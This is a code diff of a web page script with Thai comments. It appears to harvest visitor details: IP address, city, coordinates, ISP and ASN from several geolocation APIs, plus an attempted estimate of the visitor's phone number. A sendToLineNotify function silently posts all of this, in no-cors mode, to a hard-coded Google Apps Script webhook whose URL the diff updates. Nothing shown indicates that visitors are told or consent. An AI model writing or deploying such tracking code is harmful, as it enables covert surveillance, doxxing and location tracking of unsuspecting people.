@@ -594,53 +594,59 @@ function detectBrowser() {
 // ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
 async function getIPDetails() {
   try {
-    console.log("กำลังดึงข้อมูล IP จาก ipinfo.io");
-    
-    // ใช้ IP info API โดยไม่ต้องใส่ token (จำกัด request)
-    const response = await fetch('https://ipinfo.io/json');
+    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว
+    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
     if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+        // ถ้า Token ไม่ถูกต้อง หรือมีปัญหา ลองแบบไม่มี Token
+        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
+        const responseNoToken = await fetch('https://ipinfo.io/json');
+        if (!responseNoToken.ok) {
+             throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
+        }
+        return await responseNoToken.json();
     }
-    
-    const data = await response.json();
-    console.log("ได้รับข้อมูล IP:", data);
-    
-    // ปรับปรุงการจัดการข้อมูล ASN
-    if (data.org) {
-      // ipinfo.io มักจะส่งข้อมูล ASN ในรูปแบบ "AS12345 Organization Name"
-      const orgParts = data.org.split(' ');
-      if (orgParts[0] && orgParts[0].startsWith('AS')) {
-        // แยก ASN ออกจากชื่อองค์กร
-        data.asn = orgParts[0]; // เช่น "AS12345"
-        data.orgName = orgParts.slice(1).join(' '); // ชื่อองค์กร ไม่มี ASN
-      } else {
-        // กรณีที่ไม่ได้มาในรูปแบบ AS12345
-        data.asn = "ไม่ระบุ";
-        data.orgName = data.org;
-      }
-    } else if (data.as) {
-      // บางครั้ง API อาจส่งค่า AS มาโดยตรง
-      data.asn = data.as;
-    } else {
-      data.asn = "ไม่ระบุ";
-    }
-    
-    return data;
+    return await response.json();
+
   } catch (error) {
-    console.error("Error fetching IP details:", error);
-    // คืนค่าข้อมูลพื้นฐานหากเกิดข้อผิดพลาด
-    return {
-      ip: "ไม่สามารถตรวจสอบได้",
-      city: "ไม่ทราบ",
-      region: "ไม่ทราบ",
-      country: "ไม่ทราบ",
-      org: "ไม่ทราบ",
-      asn: "ไม่ระบุ", // เพิ่มค่าเริ่มต้นสำหรับ ASN
-      loc: "0,0",
-      timezone: "ไม่ทราบ"
-    };
+    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
+    // Fallback ลองใช้ ip-api.com
+    try {
+        console.log("Trying fallback: ip-api.com");
+        const fallbackResponse = await fetch('http://ip-api.com/json'); // ใช้ http เพื่อลดปัญหา CORS บางกรณี
+        if (!fallbackResponse.ok) {
+            throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
+        }
+        const fbData = await fallbackResponse.json();
+        // แปลงข้อมูลจาก ip-api.com ให้มีโครงสร้างคล้าย ipinfo.io
+        return {
+            ip: fbData.query || "ไม่สามารถระบุได้",
+            hostname: "ไม่มีข้อมูล (ip-api)", // ip-api ไม่มี hostname
+            city: fbData.city || "ไม่ทราบ",
+            region: fbData.regionName || "ไม่ทราบ",
+            country: fbData.countryCode || "ไม่ทราบ",
+            loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล",
+            org: fbData.org || "ไม่ทราบ",
+            isp: fbData.isp || "ไม่ทราบ", // ip-api มี isp แยก
+            asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", // ip-api มี as
+            postal: "ไม่มีข้อมูล (ip-api)",
+            timezone: fbData.timezone || "ไม่ทราบ"
+        };
+    } catch (fallbackError) {
+        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
+        // Fallback สุดท้าย: ipify.org (ได้แค่ IP)
+        try {
+            console.log("Trying final fallback: api.ipify.org");
+            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
+            const finalFbData = await finalFallbackResponse.json();
+            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
+        } catch (finalFallbackError) {
+             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
+             return { ip: "ไม่สามารถระบุได้" };
+        }
+    }
   }
 }
+
 
 // ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
 async function estimatePhoneNumber() {
@@ -703,64 +709,51 @@ async function estimatePhoneNumber() {
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxRsQGfijEOXEi-mi1f4y8j-VjgcC9zkgWlIDWDZll7yvrYEK7RDb4U9r-5bynMXNfZ/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw0E3_YilJ8Na21dkQgHvw-6ZYfo6IxRX58i9IWMIo7iiFTpo5XYU_8rpZOKz_mFyA/exec';
 
   // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
   if (!dataToSend.requestId) {
-    dataToSend.requestId = generateUniqueId(); 
+    console.warn("No requestId found in dataToSend, generating a new one.");
+    dataToSend.requestId = generateUniqueId();
   }
   const currentRequestId = dataToSend.requestId;
 
   // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำใน session ปัจจุบัน
   const sentKey = `sent_${currentRequestId}`;
   if (sessionStorage.getItem(sentKey)) {
-    console.log("ข้อมูลนี้ถูกส่งไปแล้ว - ไม่ส่งซ้ำ");
-    return;
+    console.log(`DUPLICATE (Session Storage): ข้อมูลสำหรับ requestId ${currentRequestId} เคยส่งแล้วใน session นี้`);
+    return; // ไม่ส่งซ้ำ
   }
 
   console.log(`กำลังส่งข้อมูลไป webhook (requestId: ${currentRequestId})`);
-  console.log("Data:", JSON.stringify(dataToSend));
-  
-  // ตรวจสอบว่ามีข้อมูล ASN ที่ถูกต้อง
-  if (dataToSend.ip) {
-    // ตรวจสอบและปรับปรุงข้อมูล ASN ที่จะส่งไป
-    if (!dataToSend.ip.asn || dataToSend.ip.asn === "ไม่ทราบ" || dataToSend.ip.asn === "") {
-      // ถ้าไม่มี asn แต่มี org ที่น่าจะมี ASN
-      if (dataToSend.ip.org) {
-        const orgParts = dataToSend.ip.org.split(' ');
-        if (orgParts[0] && orgParts[0].startsWith('AS')) {
-          dataToSend.ip.asn = orgParts[0];
-        }
-      }
-    }
-  }
-  
+  console.log("Data:", JSON.stringify(dataToSend)); // Log ข้อมูลที่จะส่ง
+
   // ส่งข้อมูลด้วย fetch API
   fetch(webhookUrl, {
     method: 'POST',
     headers: {
-      'Content-Type': 'application/json',
-      'X-Requested-With': 'XMLHttpRequest'
+      // 'Content-Type': 'application/json' // GAS doPost รับ text/plain ได้ดีกว่าเมื่อ parse JSON เอง
+      'Content-Type': 'text/plain;charset=utf-8', // ส่งเป็น text/plain
     },
-    body: JSON.stringify(dataToSend)
+    body: JSON.stringify(dataToSend), // ส่งข้อมูลเป็น JSON string
+    mode: 'no-cors' // ยังคงใช้ no-cors เพราะ GAS ไม่ได้ตั้งค่า CORS response มาตรฐาน
   })
-  .then(response => {
-    if (response.ok) {
-      console.log("ส่งข้อมูลสำเร็จ!");
-      sessionStorage.setItem(sentKey, "true");
-      return response.text();
+  .then(() => {
+    // เนื่องจากใช้ no-cors เราจะไม่ได้รับ response จริงๆ กลับมา
+    // เรา assume ว่าการส่งสำเร็จถ้าไม่มี network error
+    console.log(`ส่งข้อมูลไปยัง Server สำเร็จ (assumed success due to no-cors) - RequestId: ${currentRequestId}`);
+
+    // บันทึกว่า requestId นี้ถูกส่งแล้วใน session นี้
+    try {
+        sessionStorage.setItem(sentKey, 'true');
+        console.log(`บันทึก requestId ${currentRequestId} ลงใน sessionStorage`);
+    } catch (e) {
+        console.error("ไม่สามารถบันทึก requestId ลง sessionStorage:", e);
     }
-    throw new Error('Network response was not ok.');
-  })
-  .then(data => {
-    console.log("ตอบกลับจาก webhook:", data);
   })
   .catch(error => {
-    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
-    // อาจจะเก็บข้อมูลไว้เพื่อลองส่งอีกครั้งในภายหลัง
-    const retryData = localStorage.getItem('webhook_retry_data') ? 
-      JSON.parse(localStorage.getItem('webhook_retry_data')) : [];
-    retryData.push(dataToSend);
-    localStorage.setItem('webhook_retry_data', JSON.stringify(retryData));
+    // Catch network errors หรือข้อผิดพลาดอื่นๆ ในการส่ง
+    console.error(`เกิดข้อผิดพลาดในการส่งข้อมูล (requestId: ${currentRequestId}):`, error);
+    // อาจจะลอง retry หรือแจ้งเตือนผู้ใช้/ระบบ
   });
 }
